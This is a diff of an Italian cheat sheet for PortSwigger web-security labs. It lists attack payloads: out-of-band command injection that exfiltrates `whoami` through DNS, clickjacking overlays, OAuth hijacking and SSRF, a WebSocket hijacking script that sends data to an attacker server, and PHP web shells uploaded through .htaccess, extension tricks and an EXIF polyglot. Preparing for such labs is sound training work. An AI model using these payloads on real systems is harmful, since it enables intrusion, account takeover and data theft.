-- Link: [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
+- Segnale: l'estensione `.php` è bloccata da una blacklist, ma il server (es. Apache) permette di caricare file di configurazione custom per-directory (`.htaccess`) che non sono a loro volta bloccati.
+- Soluzione: caricare un file `.htaccess` malevolo che mappa un'estensione arbitraria/non bloccata a un tipo MIME eseguibile, poi caricare la web shell con quell'estensione.
+- Payload: `.htaccess` con contenuto `AddType application/x-httpd-php .l33t`, poi upload di `exploit.l33t` contenente PHP
+- Link: [Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)
 
-**3. Blind OS command injection con interazione out-of-band**
+**3. Bypass tramite offuscamento dell'estensione del file**
 
-- Segnale: nessun output riflesso e nessuna directory statica nota in cui scrivere; serve un canale OAST per confermare l'esecuzione.
-- Soluzione: iniettare un comando che causa una query DNS verso un dominio Burp Collaborator; l'arrivo della lookup conferma l'injection.
-- Payload: `& nslookup kgji2ohoyw.burpcollaborator.net &`
-- Link: [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
+- Segnale: la blacklist/whitelist è case-sensitive o non gestisce correttamente doppie estensioni, caratteri finali, encoding, null byte o unicode multibyte.
+- Soluzione: provare varianti come maiuscole/minuscole mischiate, doppia estensione, punti finali, URL-encoding dei punti, byte null, o posizionare la stringa bloccata in modo che la sua rimozione lasci comunque un'estensione valida.
+- Payload: es. `exploit.php.jpg`, `exploit.php.`, `exploit.p.phphp` (rimuovendo `.php` resta `.php`), `exploit.pHp`
+- Link: [Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)
 
-**4. Blind OS command injection con esfiltrazione dati out-of-band**
+**4. RCE via upload di web shell polyglot**
 
-- Segnale: come sopra, ma vuoi anche esfiltrare l'output di un comando (es. `whoami`), non solo confermare l'esecuzione.
-- Soluzione: incorporare l'output del comando (tramite command substitution) come sottodominio della query DNS verso il proprio Collaborator; il valore compare nel log delle interazioni DNS.
-- Payload: ``& nslookup `whoami`.kgji2ohoyw.burpcollaborator.net &``
-- Link: [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
-
-
-# Altre categorie — stage variabile
-
-Non presenti nel repository di riferimento botesjuan (o non mappabili a un singolo stage fisso); lo stage dipende dal contesto specifico del lab. Includono anche il Clickjacking, categoria assente dal TOC di botesjuan.
-
-
-## Clickjacking — Stage tipico: 1-2
-
-**Come riconoscerla (generale):** verifica che la pagina target NON invii `X-Frame-Options` (o lo imposti in modo permissivo) e non abbia una CSP con `frame-ancestors`; costruisci una pagina decoy che carica il target in un `<iframe>` quasi trasparente (`opacity` vicino a 0) sovrapposto esattamente a un elemento "esca" cliccabile, usando `position`/`z-index` per allineare i due layer.
-
-**1. Exploiting clickjacking per scatenare un DOM-based XSS**
-
-- Segnale: esiste un punto DOM XSS già noto (es. tramite parametro URL) e la pagina che lo contiene è frammabile (nessuna protezione anti-framing).
-- Soluzione: non serve rubare un click qualsiasi: costruisci l'iframe puntando all'URL che contiene già il payload XSS come parametro, e sovrapponi un elemento che la vittima è indotta a cliccare (il click stesso può servire solo a dare l'illusione di normalità, l'exploit XSS scatta al caricamento o al click sull'elemento vulnerabile all'interno del frame).
-- Payload: `<style>#target{position:relative;width:...;height:...;opacity:0.0001;z-index:2;}#decoy{position:absolute;z-index:1;}</style><div id=decoy>Clicca qui per il premio</div><iframe id=target src="https://TARGET/vulnerable-page?xss=PAYLOAD"></iframe>`
-- Link: [Exploiting clickjacking vulnerability to trigger DOM-based XSS](https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss)
-- Step: 1
-
-**2. Multistep clickjacking**
-
-- Segnale: l'azione sensibile richiede più passaggi (es. aggiungi al carrello poi conferma ordine), non un singolo click/form.
-- Soluzione: sovrapporre più iframe/div in sequenza, ciascuno allineato con precisione sopra un elemento "esca" diverso, così che una serie di click innocui della vittima corrisponda in realtà ai vari step dell'azione nel frame nascosto (serve calcolare con cura le coordinate per ogni step).
-- Payload: più blocchi `<div>` posizionati in sequenza sopra porzioni diverse dello stesso `<iframe>` (o iframe multipli), ciascuno sincronizzato con lo step corrispondente del flusso multi-step della vittima
-- Link: [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)
-- Step: 2
-
-
-## OAuth authentication — Stage tipico: 1-2
-
-**Come riconoscerla (generale):** con Burp intercetta il flusso "login with social"; individua la richiesta a `/authorization` (parametri `client_id`, `redirect_uri`, `response_type`, `state`) e il callback con `code`/`token`; controlla se `state` è assente (CSRF), come viene validato `redirect_uri`, e se la registrazione dinamica del client è aperta.
-
-**1. SSRF via registrazione dinamica OpenID (dynamic client registration)**
-
-- Segnale: l'endpoint `/openid/register` (o simile, da `/.well-known/openid-configuration`) accetta la registrazione di un nuovo client OAuth senza autenticazione, e tra i campi accettati ci sono URI come `logo_uri` o `jwks_uri` che il provider potrebbe andare a recuperare lato server.
-- Soluzione: registrare un client malevolo con un `jwks_uri` (o altro campo-URI) che punta a un indirizzo interno/localhost; se il provider lo recupera per validarlo, si ottiene un SSRF di secondo livello contro la rete interna.
-- Payload: `POST /openid/register` con body JSON `{"redirect_uris":["https://TUO-exploit-server/callback"],"jwks_uri":"http://169.254.169.254/",...}`
-- Link: [SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)
-- Step: 1
-
-**2. Forced OAuth profile linking (protezione CSRF assente/mancanza di `state`)**
-
-- Segnale: l'app permette login sia classico (password) sia via OAuth social, collegando l'account social a quello esistente; la richiesta di autorizzazione OAuth non include (o non valida) il parametro `state`.
-- Soluzione: iniziare tu stesso il flusso OAuth con il *tuo* account social fino a ottenere il `code`/token nell'URL di callback; costruire una pagina CSRF che fa visitare alla vittima (già loggata sul sito target con la sua sessione) quell'URL di callback con il tuo codice; l'app collegherà il *tuo* account social all'account della vittima, permettendoti poi di fare login come lei tramite il tuo account social.
-- Payload: `<img src="https://TARGET/oauth-callback?code=IL-TUO-CODICE&state=...">` servita alla vittima autenticata
-- Link: [Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
-- Step: 2
-
-**3. OAuth account hijacking via redirect\_uri**
-
-- Segnale: il server OAuth non valida rigorosamente `redirect_uri` nella richiesta di autorizzazione.
-- Soluzione: costruire un link di autorizzazione OAuth con `redirect_uri` che punta al tuo exploit server, e farlo visitare alla vittima (già loggata sul provider OAuth); il suo browser invierà il `code` al tuo server; tu rispedisci quel `code` al vero endpoint `/callback` dell'app client, venendo loggato come la vittima senza conoscerne le credenziali.
-- Payload: link che la vittima visita: `https://oauth-provider/authorization?client_id=...&redirect_uri=https://TUO-exploit-server/callback&response_type=code&scope=openid%20profile&state=...`; poi tu usi il `code` ricevuto contro `https://client-app.com/callback?code=...`
-- Link: [OAuth account hijacking via redirect\_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
-- Step: 2
-
-**4. Furto di access token OAuth via open redirect**
-
-- Segnale: il flusso usa l'implicit grant (token nel fragment dell'URL di callback); l'app client ha un open redirect su un path/sottodominio che riesci a impostare come `redirect_uri` (bypassando la whitelist, es. con directory traversal nel path `/oauth/callback/../../redirect?...`).
-- Soluzione: impostare `redirect_uri` sulla pagina con l'open redirect, così il token nel fragment viene propagato (dal browser, i fragment seguono i redirect lato client) verso un dominio sotto il tuo controllo, dove lo cattura uno script.
-- Payload: `redirect_uri=https://client-app.com/oauth/callback/../../redirect?url=https://TUO-exploit-server/steal` nella richiesta di autorizzazione, con `response_type=token`
-- Link: [Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)
-- Step: 2
-
-
-## WebSockets — Stage tipico: 1-2
-
-**Come riconoscerla (generale):** apri Burp Proxy > WebSockets history mentre usi la funzionalità dell'app; intercetta/modifica i messaggi WS con Burp Proxy/Repeater; qualsiasi vulnerabilità HTTP classica (XSS, SQLi, ecc.) può presentarsi anche nei messaggi WS, e l'handshake stesso (fatto via HTTP) può essere vulnerabile a CSRF se si basa solo sui cookie.
-
-**1. Manipolare l'handshake WebSocket per sfruttare una vulnerabilità**
-
-- Segnale: l'app usa header HTTP custom nell'handshake (es. un header che l'app fida ciecamente per decisioni di sicurezza, come un finto `X-Forwarded-For` usato per bypassare un blocco anti-brute-force).
-- Soluzione: clonare/modificare l'handshake WebSocket in Burp Repeater (icona matita vicino all'URL WS) aggiungendo o alterando header custom per sfruttare la logica difettosa lato server (es. bypassare rate-limiting su un endpoint di login esposto via WS).
-- Payload: aggiungere all'handshake un header come `X-Forwarded-For: 1.1.1.<random>` per ogni tentativo, bypassando il blocco basato su IP
-- Link: [Manipulating WebSocket messages to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)
-- Step: 1
-
-**2. Cross-site WebSocket hijacking (CSWSH)**
-
-- Segnale: la richiesta di handshake WebSocket si basa solo su cookie di sessione per l'autenticazione, senza token CSRF o altro valore non predicibile nei parametri.
-- Soluzione: creare una pagina HTML malevola ospitata sul proprio dominio che, al caricamento, apre una connessione WebSocket cross-site verso l'app vulnerabile (il browser della vittima invierà automaticamente i cookie di sessione); la pagina può poi inviare messaggi per eseguire azioni o intercettare messaggi di risposta contenenti dati sensibili.
-- Payload: pagina HTML con script `<script>var ws = new WebSocket('wss://TARGET/chat'); ws.onmessage = function(event) { fetch('https://TUO-SERVER/log?data=' + event.data); }; ws.onopen = function() { ws.send('READY'); };</script>`
-- Link: [Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
-- Step: 2
+- Segnale: il server valida il contenuto del file (non solo `Content-Type`/estensione), verificando proprieta intrinseche (dimensioni immagine) o magic bytes (es. `FF D8 FF` per JPEG).
+- Soluzione: creare un file polyglot che è un'immagine JPEG valida (passa i controlli sui magic bytes/dimensioni) ma contiene codice PHP nei metadata EXIF, usando un tool come ExifTool; se il server lo serve/esegue da una posizione eseguibile, il codice PHP nei metadata viene eseguito.
+- Payload: `exiftool -Comment="<?php echo system($_GET['command']); ?>" originale.jpg -o polyglot.php` poi caricare `polyglot.php`
+- Link: [Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)
 
 
 ## Essential skills — Stage tipico: 1-2-3
